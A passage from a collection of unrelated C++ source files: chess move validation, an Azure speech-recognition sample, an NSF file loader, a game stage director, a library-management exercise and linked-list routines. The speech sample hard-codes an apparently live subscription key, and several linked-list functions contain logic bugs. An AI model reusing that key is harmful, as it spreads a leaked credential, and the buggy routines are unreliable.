muove nella casella laterale\n            if (chessboard[newPos.y][newPos.x] <= pieceType::WHITEKING && (pos.x == newPos.x - 1 || pos.x == newPos.x + 1))\n                return 1;\n        }\n        // Verifica il caso in cui il si vuole muovere di due caselle\n        if (pos.y == 1)\n        {\n            if (\n                (newPos.y == pos.y + 2 && pos.x == newPos.x)\n                && \n                (chessboard[newPos.y][newPos.x] == pieceType::EMPTY && chessboard[newPos.y - 1][newPos.x] == pieceType::EMPTY)\n               )\n                return 1;\n        }\n        break;\n    }\n\n    // Se nessuna delle precedenti affermazioni risulta essere vera allora non era valida\n    return 0;\n}",
    "\ufeff#include <iostream> \n#include <stdlib.h>\n#include <speechapi_cxx.h>\n\n#include <string>\n#include <atlstr.h>\n#include <stdio.h>\n\nusing namespace std;\n\nusing namespace Microsoft::CognitiveServices::Speech;\nusing namespace Microsoft::CognitiveServices::Speech::Audio;\nusing namespace Microsoft::CognitiveServices::Speech::Translation;\n\n\nBOOL CreateString_InitWithUTF8Text(CString& str, char* pUTF8Text)\n{\n\tif (NULL == pUTF8Text)\n\t{\n\t\treturn FALSE;\n\t}\n\n\tint  unicodeLen = ::MultiByteToWideChar(CP_UTF8,\n\t\t0,\n\t\tpUTF8Text,\n\t\t-1,\n\t\tNULL,\n\t\t0);\n\n\twchar_t* pUnicode = new  wchar_t[unicodeLen + 1];\n\tif (NULL == pUnicode)\n\t{\n\t\treturn FALSE;\n\t}\n\n\tMultiByteToWideChar(CP_UTF8, 0, pUTF8Text, -1, (LPWSTR)pUnicode, unicodeLen);\n\n\tstr = pUnicode;\n\n\tdelete[]pUnicode;\n\treturn TRUE;\n}\n\n\nint main()\n{\n\t// This example requires environment variables named \"SPEECH_KEY\" and \"SPEECH_REGION\"\n\t//auto speechKey = GetEnvironmentVariable(\"SPEECH_KEY\");\n\t//auto speechRegion = GetEnvironmentVariable(\"SPEECH_REGION\");\n\n\tstring speechKey = \"57149b475b6d4fab955f96408eb49f9e\";\n\tstring speechRegion = \"southeastasia\";\n\n\tif ((size(speechKey) == 0) || (size(speechRegion) == 0)) {\n\t\tstd::cout << \"Please set both SPEECH_KEY and SPEECH_REGION environment variables.\" << std::endl;\n\t\treturn -1;\n\t}\n\n\tauto speechConfig = SpeechConfig::FromSubscription(speechKey, speechRegion);\n\n\t//speechConfig->SetSpeechRecognitionLanguage(\"en-US\");\n\tspeechConfig->SetSpeechRecognitionLanguage(\"zh-CN\");\n\tspeechConfig->SetSpeechSynthesisLanguage(\"en-US\");\n\tspeechConfig->SetSpeechSynthesisLanguage(\"zh-CN-sichuan\");\n\n\tauto audioConfig = AudioConfig::FromDefaultMicrophoneInput();\n\tauto speechRecognizer = SpeechRecognizer::FromConfig(speechConfig, audioConfig);\n\n\tstd::cout << \"Speak into your microphone.\\n\";\n\tspeechRecognizer->StartContinuousRecognitionAsync().get();\n\n\tpromise<void> recognitionEnd;\n\t// Waits for recognition end.\n\t//recognitionEnd.get_future().get();\n\t\n\ttry\n\t{\n\t\tspeechRecognizer->Recognizing.Connect([](const SpeechRecognitionEventArgs& e)\n\t\t\t{\n\t\t\t\tstring strText = e.Result->Text;\n\t\t\t\tcout << \"Recognizing:\" << strText << std::endl;\n\t\t\t\tCString cstrText;\n\t\t\t\tCreateString_InitWithUTF8Text(cstrText, (char*)strText.c_str());\n\t\t\t\tcout << \"Recognizing:\" << cstrText.GetBuffer() << std::endl;\n\t\t\t});\n\n\t\tcout << \"Recognizing end\" << endl;\n\n\t\tspeechRecognizer->Recognized.Connect([](const SpeechRecognitionEventArgs& e)\n\t\t\t{\n\t\t\t\tif (e.Result->Reason == ResultReason::RecognizedSpeech)\n\t\t\t\t{\n\t\t\t\t\tstring strText = e.Result->Text;\n\t\t\t\t\tcout << \"RECOGNIZED: Text=\" << strText\n\t\t\t\t\t\t<< \" (text could not be translated)\" << std::endl;\n\n\t\t\t\t\tCString cstrText;\n\t\t\t\t\tCreateString_InitWithUTF8Text(cstrText, (char*)strText.c_str());\n\t\t\t\t\tcout << \"RECOGNIZED: Text=\" << cstrText.GetBuffer()\n\t\t\t\t\t\t<< \" (text could not be translated)\" << std::endl;\n\t\t\t\t}\n\t\t\t\telse if (e.Result->Reason == ResultReason::NoMatch)\n\t\t\t\t{\n\t\t\t\t\tcout << \"NOMATCH: Speech could not be recognized.\" << std::endl;\n\t\t\t\t}\n\t\t\t});\n\n\t\tcout << \"Recognized end\" << endl;\n\n\t\tspeechRecognizer->Canceled.Connect([&recognitionEnd](const SpeechRecognitionCanceledEventArgs& e)\n\t\t\t{\n\t\t\t\tcout << \"CANCELED: Reason=\" << (int)e.Reason << std::endl;\n\t\t\t\tif (e.Reason == CancellationReason::Error)\n\t\t\t\t{\n\t\t\t\t\tcout << \"CANCELED: ErrorCode=\" << (int)e.ErrorCode << \"\\n\"\n\t\t\t\t\t\t<< \"CANCELED: ErrorDetails=\" << e.ErrorDetails << \"\\n\"\n\t\t\t\t\t\t<< \"CANCELED: Did you set the speech resource key and region values?\" << std::endl;\n\n\t\t\t\t\trecognitionEnd.set_value(); // Notify to stop recognition.\n\t\t\t\t}\n\t\t\t});\n\n\t\tcout << \"Canceled end\" << endl;\n\t\tspeechRecognizer->SessionStopped.Connect([&recognitionEnd](const SessionEventArgs& e)\n\t\t\t{\n\t\t\t\tcout << \"Session stopped.\" << endl;\n\t\t\t\t//recognitionEnd.set_value(); // Notify to stop recognition.\n\t\t\t});\n\n\t\tcout << \"SessionStopped\" << endl;\n\n\t\tcout << \"get_future begin\" << endl;\n\t\trecognitionEnd.get_future().get();\n\t\tcout << \"get_future end\" << endl;\n\n\t\t// Stops recognition.\n\t\tspeechRecognizer->StopContinuousRecognitionAsync().get();\n\t\tcout << \"close normal\" << endl;\n\t}\n\tcatch (exception e)\n\t{\n\t\tcout << \"\\nexception=\" << e.what() << endl;\n\t}\n\tcout << \"Please press a key to continue.\\n\";\n\tgetchar();\n\treturn 0;\n}\n",
    "/* \n * Copyright (C) 2004      Disch\n *\n * This program is free software; you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation; either version 2 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program; if not, write to the Free Software\n * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA \n */\n\n//////////////////////////////////////////////////////////////////////////\n//\n//  NSF_File.cpp\n//\n//\n\n\n#define WIN32_LEAN_AND_MEAN\n#include <Windows.h>\n#include <stdio.h>\n#include \"NSF_Core.h\"\n#include \"NSF_File.h\"\n\n#define SAFE_DELETE(p) { if(p){ delete[] p; p = NULL; } }\n#define SAFE_NEW(p,t,s,r) p = new t[s]; if(!p) return r; ZeroMemory(p,sizeof(t) * s)\n\n\nint\t\tCNSFFile::LoadFile(LPCSTR path,BYTE needdata,BYTE ignoreversion)\n{\n\tDestroy();\n\n\tFILE* file = fopen(path,\"rb\");\n\tif(!file) return -1;\n\n\tUINT type = 0;\n\tfread(&type,4,1,file);\n\tint ret = -1;\n\n\tif(type == HEADERTYPE_NESM)\t\tret = LoadFile_NESM(file,needdata,ignoreversion);\n\tif(type == HEADERTYPE_NSFE)\t\tret = LoadFile_NSFE(file,needdata);\n\n\tfclose(file);\n\n\t// Snake's revenge puts '00' for the initial track, which (after subtracting 1) makes it 256 or -1 (bad!)\n\t// This prevents that crap\n\tif(nInitialTrack >= nTrackCount)\n\t\tnInitialTrack = 0;\n\tif(nInitialTrack < 0)\n\t\tnInitialTrack = 0;\n\n\t// if there's no tracks... this is a crap NSF\n\tif(nTrackCount < 1)\n\t{\n\t\tDestroy();\n\t\treturn -1;\n\t}\n\n\treturn ret;\n}\n\nvoid\tCNSFFile::Destroy()\n{\n\tSAFE_DELETE(pDataBuffer);\n\tSAFE_DELETE(pPlaylist);\n\tSAFE_DELETE(pTrackTime);\n\tSAFE_DELETE(pTrackFade);\n\tif(szTrackLabels)\n\t{\n\t\tfor(int i = 0; i < nTrackCount; i++)\n\t\t\tSAFE_DELETE(szTrackLabels[i]);\n\t\tSAFE_DELETE(szTrackLabels);\n\t}\n\tSAFE_DELETE(szGameTitle);\n\tSAFE_DELETE(szArtist);\n\tSAFE_DELETE(szCopyright);\n\tSAFE_DELETE(szRipper);\n\n\tZeroMemory(this,sizeof(CNSFFile));\n}\n\nint CNSFFile::LoadFile_NESM(FILE* file,BYTE needdata,BYTE ignoreversion)\n{\n\tint len;\n\n\tfseek(file,0,SEEK_END);\n\tlen = ftell(file) - 0x80;\n\tfseek(file,0,SEEK_SET);\n\n\tif(len < 1) return -1;\n\n\t//read the info\n\tNESM_HEADER\t\t\t\t\thdr;\n\tfread(&hdr,0x80,1,file);\n\n\t//confirm the header\n\tif(hdr.nHeader != HEADERTYPE_NESM)\t\t\treturn -1;\n\tif(hdr.nHeaderExtra != 0x1A)\t\t\t\treturn -1;\n\tif((!ignoreversion) && (hdr.nVersion != 1))\treturn -1; //stupid NSFs claim to be above version 1  >_>\n\n\t//NESM is generally easier to work with (but limited!)\n\t//  just move the data over from NESM_HEADER over to our member data\n\n\tbIsExtended =\t\t\t\t0;\n\tnIsPal =\t\t\t\t\thdr.nNTSC_PAL & 0x03;\n\tnPAL_PlaySpeed =\t\t\thdr.nSpeedPAL;\t\t\t//blarg\n\tnNTSC_PlaySpeed =\t\t\thdr.nSpeedNTSC;\t\t\t//blarg\n\tnLoadAddress =\t\t\t\thdr.nLoadAddress;\n\tnInitAddress =\t\t\t\thdr.nInitAddress;\n\tnPlayAddress =\t\t\t\thdr.nPlayAddress;\n\tnChipExtensions =\t\t\thdr.nExtraChip;\n\n\n\tnTrackCount =\t\t\t\thdr.nTrackCount;\n\tnInitialTrack =\t\t\t\thdr.nInitialTrack - 1;\t//stupid 1-based number =P\n\n\tmemcpy(nBankswitch,hdr.nBankSwitch,8);\n\n\tSAFE_NEW(szGameTitle,char,33,1);\n\tSAFE_NEW(szArtist   ,char,33,1);\n\tSAFE_NEW(szCopyright,char,33,1);\n\n\tmemcpy(szGameTitle,hdr.szGameTitle,32);\n\tmemcpy(szArtist   ,hdr.szArtist   ,32);\n\tmemcpy(szCopyright,hdr.szCopyright,32);\n\n\t//read the NSF data\n\tif(needdata)\n\t{\n\t\tSAFE_NEW(pDataBuffer,BYTE,len,1);\n\t\tfread(pDataBuffer,len,1,file);\n\t\tnDataBufferSize = len;\n\t}\n\n\t//if we got this far... it was a successful read\n\treturn 0;\n}\n\nint CNSFFile::LoadFile_NSFE(FILE* file,BYTE needdata)\n{\n\t//restart the file\n\tfseek(file,0,SEEK_SET);\n\n\t//the vars we'll be using\n\tUINT nChunkType;\n\tint  nChunkSize;\n\tint  nChunkUsed;\n\tint  nDataPos = 0;\n\tBYTE\tbInfoFound = 0;\n\tBYTE\tbEndFound = 0;\n\tBYTE\tbBankFound = 0;\n\n\tNSFE_INFOCHUNK\tinfo;\n\tZeroMemory(&info,sizeof(NSFE_INFOCHUNK));\n\tinfo.nTrackCount = 1;\t\t//default values\n\n\t//confirm the header!\n\tfread(&nChunkType,4,1,file);\n\tif(nChunkType != HEADERTYPE_NSFE)\t\t\treturn -1;\n\n\t//begin reading chunks\n\twhile(!bEndFound)\n\t{\n\t\tif(feof(file))\t\t\t\t\t\t\treturn -1;\n\t\tfread(&nChunkSize,4,1,file);\n\t\tfread(&nChunkType,4,1,file);\n\n\t\tswitch(nChunkType)\n\t\t{\n\t\tcase CHUNKTYPE_INFO:\n\t\t\tif(bInfoFound)\t\t\t\t\t\treturn -1;\t//only one info chunk permitted\n\t\t\tif(nChunkSize < 8)\t\t\t\t\treturn -1;\t//minimum size\n\n\t\t\tbInfoFound = 1;\n\t\t\tnChunkUsed = min((int)sizeof(NSFE_INFOCHUNK),nChunkSize);\n\n\t\t\tfread(&info,nChunkUsed,1,file);\n\t\t\tfseek(file,nChunkSize - nChunkUsed,SEEK_CUR);\n\n\t\t\tbIsExtended =\t\t\t1;\n\t\t\tnIsPal =\t\t\t\tinfo.nIsPal & 3;\n\t\t\tnLoadAddress =\t\t\tinfo.nLoadAddress;\n\t\t\tnInitAddress =\t\t\tinfo.nInitAddress;\n\t\t\tnPlayAddress =\t\t\tinfo.nPlayAddress;\n\t\t\tnChipExtensions =\t\tinfo.nExt;\n\t\t\tnTrackCount =\t\t\tinfo.nTrackCount;\n\t\t\tnInitialTrack =\t\t\tinfo.nStartingTrack;\n\n\t\t\tnPAL_PlaySpeed =\t\t(WORD)(1000000 / PAL_NMIRATE);\t\t//b",
    "#include \"GameDirector.hpp\"\n#include \"ObjectDirector.hpp\"\n\nnamespace Game\n{\n    void GameDirector::Initialize() noexcept\n    {\n        nowScore = 0;\n\n        nowTimeLimit = 90;\n\n        elapsedDelta = 0;\n\n        nowEvent = Event::None;\n\n        nowLevel = 1;\n\n        time = 0;\n\n        wave = 0;\n    }\n\n    void GameDirector::Update() noexcept\n    {\n        Stage();\n\n        if (nowTimeLimit == 0)\n        {\n            nowEvent = Event::GameClear;\n        }\n        else\n        {\n            elapsedDelta += FrameRate::GetDeltaTime();\n\n            // \u4e00\u79d2\u9032\u3093\u3060\u3089\u4e00\u3064\u30ab\u30a6\u30f3\u30c8\u30c0\u30a6\u30f3\u3059\u308b\n            if (elapsedDelta >= 1)\n            {\n                elapsedDelta = 0;\n                --nowTimeLimit;\n            }\n\n            // 20\u79d2\u3054\u3068\u306b\u30ec\u30d9\u30eb\u30a2\u30c3\u30d7\n            if (nowTimeLimit == 70 || nowTimeLimit == 50 || nowTimeLimit == 30 || nowTimeLimit == 10)\n            {\n                ++nowLevel;\n                ObjectDirector::GetInstance().GetUIManager()->GetUI<LevelUp>()->Trigger();\n            }\n        }\n\n        const auto& player = ObjectDirector::GetInstance().GetPlayer();\n\n        /* \u30d7\u30ec\u30a4\u30e4\u30fc\u3068\u969c\u5bb3\u7269\u306e\u885d\u7a81\u5224\u5b9a */\n        {\n            const auto& container = ObjectDirector::GetInstance().GetObstacleManager()->GetContainer();\n\n            for (const auto& obstacle : container)\n            {\n                if (obstacle->GetState() == Obstacle::State::Inactive)\n                {\n                    continue;\n                }\n\n                /* \u5f53\u305f\u3063\u305f\u3089\u30b2\u30fc\u30e0\u30aa\u30fc\u30d0\u30fc\u30a4\u30d9\u30f3\u30c8\u3092\u767a\u751f\u3055\u305b\u308b */\n                if (CircleColider::IsCollision(player->GetColider(), obstacle->GetColider()))\n                {\n                    nowEvent = Event::GameOver;\n                }\n            }\n        }\n\n        /* \u30d7\u30ec\u30a4\u30e4\u30fc\u3068\u30b3\u30a4\u30f3\u306e\u885d\u7a81\u5224\u5b9a */\n        {\n            const auto& container = ObjectDirector::GetInstance().GetCoinManager()->GetContainer();\n\n            for (const auto& coin : container)\n            {\n                if (coin->GetState() == Coin::State::Inactive)\n                {\n                    continue;\n                }\n\n                const auto& icon = ObjectDirector::GetInstance().GetUIManager()->GetUI<CharaIcon>();\n\n                /* \u30d7\u30ec\u30a4\u30e4\u30fc\u3068\u63a5\u89e6\u3057\u305f\u3089\u3001\u7372\u5f97\u30c8\u30ea\u30ac\u30fc\u3092\u7acb\u3066\u308b */\n                if (coin->GetState() == Coin::State::Active && CircleColider::IsCollision(player->GetColider(), coin->GetColider()))\n                {\n                    coin->GetCoin();\n                }\n\n                /* \u7372\u5f97\u6f14\u51fa\u304c\u7d42\u4e86\u3057\u305f\u3089\u30b3\u30a4\u30f3\u3092\u7372\u5f97\u3059\u308b */\n                if (coin->GetState() == Coin::State::Get && coin->GetPosition().y <= icon->GetPosition().y + 30)\n                {\n                    nowScore += coin->GetAcquisitionScore();\n\n                    coin->Delete();\n                }\n            }\n        }\n    }\n\n    void GameDirector::Stage() noexcept\n    {\n        auto obst = ObjectDirector::GetInstance().GetObstacleManager();\n        auto coin = ObjectDirector::GetInstance().GetCoinManager();\n\n        time += FrameRate::GetDeltaTime();\n\n        // tutorial\n        if (time >= 0.5 && wave == 0)\n        {\n            wave++;\n            coin->Generate<SilverCoin>(850);\n        }\n        else if (time >= 0.75 && wave == 1)\n        {\n            wave++;\n            coin->Generate<SilverCoin>(750);\n        }\n        else if (time >= 1 && wave == 2)\n        {\n            wave++;\n            coin->Generate<SilverCoin>(850);\n        }\n        else if (time >= 1.25 && wave == 3)\n        {\n            wave++;\n            coin->Generate<SilverCoin>(750);\n        }\n        else if (time >= 1.55 && wave == 4)\n        {\n            wave++;\n            coin->Generate<GoldCoin>(650);\n        }\n        else if (time >= 2.85 && wave == 5)\n        {\n            wave++;\n            obst->Generate<GroundSpike>();\n            coin->Generate<SilverCoin>(750);\n        }\n        else if (time >= 4.75 && wave == 6)\n        {\n            wave++;\n            obst->Generate<GroundSpike>();\n            coin->Generate<SilverCoin>(750);\n        }\n        else if (time >= 5.75 && wave == 7)\n        {\n            wave++;\n            obst->Generate<GroundSpike>();\n            coin->Generate<GoldCoin>(750);\n        }\n        else if (time >= 6.75 && wave == 8)\n        {\n            wave++;\n            obst->Generate<GroundSpike>();\n            coin->Generate<RedCoin>(750);\n        }\n\n        // level1\n        else if (time >= 9 && wave == 9)\n        {\n            wave++;\n            obst->Generate<GroundSpike>();\n        }\n        else if (time >= 9.5 && wave == 10)\n        {\n            wave++;\n            coin->Generate<SilverCoin>(850);\n            coin->Generate<SilverCoin>(750);\n            coin->Generate<SilverCoin>(650);\n        }\n        else if (time >= 10.25 && wave == 11)\n        {\n            wave++;\n            obst->Generate<GroundSpike>();\n        }\n        else if (time >= 10.75 && wave == 12)\n        {\n            wave++;\n            obst->Generate<GroundSpike>();\n        }\n        else if (time >= 11.25 && wave == 13)\n        {\n            wave++;\n            obst->Generate<GroundSpike>();\n        }\n        else if (ti",
    "//This Program Is Created By PatelDharam23CE092.\r\n//Purpose :- Develop a C++ program for library management system.\r\n//concept :- Virtual class,hybrid inheritance.\r\n#include<iostream>\r\n#include<iomanip>\r\n#include<stdlib.h>\r\n#include<string>\r\nusing namespace std;\r\n\r\nclass literature {\r\nprivate :\r\n    long int uni_id;\r\n    string title;\r\npublic :\r\n    void getdata() {\r\n        cout << \"***** Add Book Data *****\" << endl;\r\n        cout << \"ID : \";\r\n        cin >> uni_id;\r\n        fflush(stdin);\r\n        cout << \"Title : \";\r\n        getline(cin, title);\r\n    }\r\n    void putdata() {\r\n        cout << left << setw(15) << uni_id << left << setw(15) << title;\r\n    }\r\n};\r\n//e_literature class is virtual publicly inherited from literature class;\r\nclass e_literature : virtual public literature {\r\nprivate :\r\n    string doi;\r\npublic :\r\n    void getdata() {\r\n        cout << \"DOI : \";\r\n        fflush(stdin);\r\n        getline(cin, doi);\r\n    }\r\n    void putdata() {\r\n        cout << doi;\r\n    }\r\n};\r\n//Hard_bound class is virtual publicly inherited from literature class;\r\nclass hard_bound : virtual public literature {\r\nprivate :\r\n    int number_of_copies;\r\npublic :\r\n    void getdata() {\r\n        cout << \"In stock copies : \";\r\n        cin >> number_of_copies;\r\n    }\r\n    void putdata() {\r\n        cout << number_of_copies;\r\n    }\r\n};\r\n//booksclass is virtual publicly inherited from e_literature and Hard_bound class;\r\nclass books : virtual public hard_bound , virtual public e_literature {\r\nprivate :\r\n    int isbn;\r\n    int book_type;\r\n    char ch;\r\npublic :\r\n    void getdata() {\r\n        literature::getdata();\r\n        cout << \"ISBN : \";\r\n        cin >> isbn;\r\n        cout << \"(E)copy or (H)ardbound : \";\r\n        cin >> ch;\r\n        if (ch == 'E' || ch == 'e') {\r\n            book_type = 1;\r\n            e_literature::getdata();\r\n        }\r\n        if (ch == 'H' || ch == 'h') {\r\n            book_type = 2;\r\n            hard_bound::getdata();\r\n        }\r\n    }\r\n    void putdata() {\r\n        literature::putdata();\r\n        cout << left << setw(15) << isbn;\r\n        if (book_type == 1) {\r\n            e_literature::putdata();\r\n        }\r\n        if (book_type == 2) {\r\n            hard_bound::putdata();\r\n        }\r\n    }\r\n};\r\n//magazines class is virtual publicly inherited from e_literature and Hard_bound class;\r\nclass magazines : virtual public hard_bound , virtual public e_literature {\r\nprivate :\r\n    int issn;\r\n    char ch;\r\n    int m_type;\r\npublic :\r\n    void getdata() {\r\n        literature::getdata();\r\n        cout << \"ISSN : \";\r\n        cin >> issn;\r\n        cout << \"(E)copy or (H)ardbound : \";\r\n        cin >> ch;\r\n        if (ch == 'E' || ch == 'e') {\r\n            m_type = 1;\r\n            e_literature ::getdata();\r\n        }\r\n        else if (ch == 'H' || ch == 'h') {\r\n            m_type = 2;\r\n            hard_bound::getdata();\r\n        }\r\n    }\r\n    void putdata() {\r\n        literature::putdata();\r\n        cout << left << setw(15) << issn;\r\n        if (m_type == 1) {\r\n            e_literature::putdata();\r\n        }\r\n        if (m_type == 2) {\r\n            hard_bound::putdata();\r\n        }\r\n    }\r\n};\r\n\r\nchar enterchoice() {\r\n    char ch;\r\n    cout << endl << \"Enter M to go to main menu or press any key to exit : \";\r\n    cin >> ch;\r\n    cout << endl;\r\n    return ch;\r\n}\r\n\r\nint main() {\r\n    int choice;\r\n    int book_count = 0, magazine_count = 0;\r\n\r\n    books* ptr_b[500];\r\n    magazines* ptr_m[500];\r\n\r\n    char ch = 'm';\r\n\r\n    while (ch == 'M' || ch == 'm') {\r\n        cout << endl << \"Enter 1 : Add Book Data\" << endl;\r\n        cout << \"Enter 2 : Add Magazine Data\" << endl;\r\n        cout << \"Enter 3 : List All Books\" << endl;\r\n        cout << \"Enter 4 : List All Magazine\" << endl;\r\n        cout << \"Enter Your Choice : \";\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n            case 1:\r\n                ptr_b[book_count] = new books();\r\n                ptr_b[book_count]->getdata();\r\n                book_count++;\r\n                ch = enterchoice();\r\n                break;\r\n\r\n            case 2:\r\n                ptr_m[magazine_count] = new magazines();\r\n                ptr_m[magazine_count]->getdata();\r\n                magazine_count++;\r\n                ch = enterchoice();\r\n                break;\r\n\r\n            case 3:\r\n                for (int i = 0; i < book_count; ++i) {\r\n                    ptr_b[i]->putdata();\r\n                    cout << endl;\r\n                }\r\n                ch = enterchoice();\r\n                break;\r\n\r\n            case 4:\r\n                for (int i = 0; i < magazine_count; ++i) {\r\n                    ptr_m[i]->putdata();\r\n                    cout << endl;\r\n                }\r\n                ch = enterchoice();\r\n                break;\r\n\r\n            default:\r\n                cout << \"Invalid choice\" << endl;\r\n                break;\r\n        }\r\n    }\r\n\r\n    for (int i = 0; i < book_count; ++i) {\r\n        delete ptr_b[i];\r\n    }\r\n\r\n    for (int i = 0; i < magazine_count; ++i) {\r\n        delete ptr_m",
    "\ufeff#include \"function.h\"\n\nvoid inputList(list& l)\n{\n\tint n;\n\tcin >> n;\n\tl = initList();\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tint value;\n\t\tcin >> value;\n\t\taddLast(l, value);\n\t}\n}\nnode* getNode(int value)\n{\n\tnode* p = new node;\n\tif (p == NULL)\n\t{\n\t\treturn NULL;\n\t}\n\tp->key = value;\n\tp->next = NULL;\n\treturn p;\n}\nvoid printList(list l)\n{\n\tnode* p = l.pHead;\n\twhile (p != NULL)\n\t{\n\t\tcout << p->key << \" \";\n\t\tp = p->next;\n\t}\n}\nvoid addHead(list& l, int value)\n{\n\tnode* p = getNode(value);\n\tif (l.pHead == NULL)\n\t{\n\t\tl.pHead = p;\n\t}\n\telse\n\t{\n\t\tp->next = l.pHead;\n\t\tl.pHead = p;\n\t}\n}\nint sizeList(list l)\n{\n\tint cnt = 0;\n\tnode* p = l.pHead;\n\twhile (p != NULL)\n\t{\n\t\tcnt++;\n\t\tp = p->next;\n\t}\n\treturn cnt;\n}\nvoid insertNode(list& l, int value, int position)\n{\n\tif (position < 0 || position > sizeList(l))\n\t{\n\t\treturn;\n\t}\n\tnode* p = getNode(value);\n\t\n\tint i = 0;\n\tif (position == 0)\n\t{\n\t\tp->next = l.pHead;\n\t\treturn;\n\t}\n\tnode* cur = l.pHead;\n\tnode* prev = NULL;\n\twhile ( i < position)\n\t{\n\t\ti++;\n\t\tprev = cur;\n\t\tcur = cur->next;\n\t}\n\tprev->next = p;\n\tp->next = cur;\n}\nvoid deleteNode(list& l, int position)\n{\n\tif (position < 0 || position >= sizeList(l))\n\t{\n\t\treturn;\n\t}\n\tif (position == 0)\n\t{\n\t\tdelete l.pHead;\n\t\tl.pHead = NULL;\n\t}\n\telse\n\t{\n\t\tnode* cur = l.pHead;\n\t\tnode* prev = NULL;\n\t\tint i = 0;\n\t\twhile (i < position)\n\t\t{\n\t\t\ti++;\n\t\t\tprev = cur;\n\t\t\tcur = cur->next;\n\t\t}\n\t\tprev->next = cur->next;\n\t\tdelete cur;\n\t\tcur = NULL;\n\t}\n}\nvoid printListReverse(node* pHead)\n{\n\tif (pHead->next == NULL)\n\t{\n\t\tcout << pHead->key << \" \";\n\t}\n\telse\n\t{\n\t\tprintListReverse(pHead->next);\n\t\tcout << pHead->key << \" \";\n\t}\n}\nvoid reverseList(list& l)\n{\n\tif (l.pHead->next == NULL)\n\t{\n\t\treturn;\n\t}\n\tnode* prev = NULL, * cur = l.pHead, * next = NULL;\n\twhile (cur != NULL)\n\t{\n\t\tnext = cur->next;\n\n\t\tcur->next = prev;\n\n\n\t\tprev = cur;\n\t\tcur = next;\n\n\t}\n\tl.pHead = prev;\n}\nbool compareLists(list l1, list l2)\n{\n\tnode* p1 = l1.pHead, * p2 = l2.pHead;\n\twhile (p1 != NULL && p2 != NULL)\n\t{\n\t\tif (p1->key != p2->key)\n\t\t{\n\t\t\treturn false;\n\t\t}\n\t\tp1 = p1->next;\n\t\tp2 = p2->next;\n\t}\n\treturn p1 == NULL && p2 == NULL;\n}\nlist mergeList(list l1, list l2)\n{\n\tlist l0 = initList();\n\tnode* p1 = l1.pHead, * p2 = l2.pHead;\n\tif (l1.pHead == NULL)\n\t{\n\t\treturn l2;\n\t}\n\telse if (l2.pHead == NULL)\n\t{\n\t\treturn l1;\n\t}\n\telse\n\t{\n\t\t//N\u1ebfu th\u00eam th\u00ec nh\u1ea3y\n\t\twhile (p1 != NULL && p2 != NULL)\n\t\t{\n\t\t\tif (p1->key < p2->key)\n\t\t\t{\n\t\t\t\taddLast(l0, p1->key);\n\t\t\t\tp1 = p1->next;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\taddLast(l0, p2->key);\n\t\t\t\tp2 = p2->next;\n\t\t\t}\n\t\t}\n\n\t\t//Th\u00eam v\u00e0o c\u00e1c node th\u1eeba n\u1ebfu c\u00f3\n\t\twhile (p1 != NULL)\n\t\t{\n\t\t\taddLast(l0, p1->key);\n\t\t\tp1 = p1->next;\n\t\t}\n\t\twhile (p2 != NULL)\n\t\t{\n\t\t\taddLast(l0, p2->key);\n\t\t\tp2 = p2->next;\n\t\t}\n\n\t\treturn l0;\n\t}\n}\nint getNodeValue(list l, int position)\n{\n\tif (position < 0 || position >= sizeList(l))\n\t{\n\t\treturn -1;\n\t}\n\telse if (l.pHead == NULL)\n\t{\n\t\treturn -1;\n\t}\n\telse\n\t{\n\t\tnode* p = l.pHead;\n\t\tfor (int i = 0; i < position; i++, p = p->next);\n\t\treturn p->key;\n\t}\n}\nlist removeDuplicates(list l)\n{\n\tlist l0 = initList();\n\tnode* p = l.pHead;\n\tl0.pHead = getNode(p->key);\n\t\n\twhile (p != NULL)\n\t{\n\t\tbool isExist = false;\n\t\tnode* p0 = l0.pHead;\n\t\twhile (p0 != NULL)\n\t\t{\n\t\t\tif (p0->key == p->key)\n\t\t\t{\n\t\t\t\tisExist = true;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tp0 = p0->next;\n\t\t}\n\t\tif (isExist == false)\n\t\t{\n\t\t\taddLast(l0, p->key);\n\t\t}\n\n\t\tp = p->next;\n\t}\n\treturn l0;\n}\nbool hasCycle(list l)\n{\n\tnode* p = l.pHead;\n\twhile (p != NULL)\n\t{\n\t\tnode* q = p->next;\n\t\twhile (q != NULL)\n\t\t{\n\t\t\tif (q->key == p->key)\n\t\t\t{\n\t\t\t\treturn true;\n\t\t\t}\n\t\t\tq = q->next;\n\t\t}\n\t\tp = p->next;\n\t}\n\treturn false;\n}\n//int findMergeNode(list l1, list l2);\nvoid sortedInsert(list& l, int value)\n{\n\tnode* p = getNode(value);\n\tif (l.pHead == NULL)\n\t{\n\t\tl.pHead = p;\n\t}\n\telse if(value <= l.pHead->key)\n\t{\n\t\tp->next = l.pHead;\n\t\tl.pHead = p;\n\t}\n\telse\n\t{\n\t\tnode* cur = l.pHead, * prev = NULL;\n\t\twhile (cur->key < value)\n\t\t{\n\t\t\tprev = cur;\n\t\t\tcur = cur->next;\n\t\t}\n\t\tprev->next = p;\n\t\tp->next = cur;\n\t}\n}\nlist initList()\n{\n\tlist l;\n\tl.pHead = NULL;\n\treturn l;\n}\nvoid swapNode(node*& node1, node*& node2)\n{\n\tint temp = node1->key;\n\tnode1->key = node2->key;\n\tnode2->key = temp;\n}\nvoid sortList(list& l)\n{\n\tif (l.pHead == NULL || l.pHead->next == NULL)\n\t{\n\t\treturn;\n\t}\n\n\tnode* p = l.pHead;\n\twhile (p != NULL)\n\t{\n\t\tnode* q = p->next;\n\t\tnode* minNode = p;\n\t\twhile (q != NULL)\n\t\t{\n\t\t\tif (q->key < minNode->key)\n\t\t\t{\n\t\t\t\tminNode = q;\n\t\t\t}\n\t\t\tq = q->next;\n\t\t}\n\t\tswapNode(p, minNode);\n\t\tp = p->next;\n\t}\n}\nvoid addLast(list& l, int value)\n{\n\tnode* p = getNode(value);\n\tif (l.pHead == NULL)\n\t{\n\t\tl.pHead = p;\n\t}\n\telse\n\t{\n\t\tnode* q = 